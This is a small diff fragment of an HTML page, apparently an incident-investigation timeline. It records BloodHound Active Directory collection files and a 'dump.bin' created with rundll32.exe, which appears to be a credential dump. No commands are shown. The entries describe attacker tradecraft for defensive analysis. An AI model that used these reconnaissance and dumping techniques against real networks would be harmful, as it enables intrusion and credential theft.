+<p>⏰ 23:48:11</p>
+<p>bloodhound.zip, svchost.exe.log, domains.json, ous.json, gpos.json, users.json.</p>
+<p>⏰ 23:50:14</p>
+<p>dump.bin created with rundll32.exe.</p>
 <h2 id="investigation">Investigation</h2>
 
   </div>
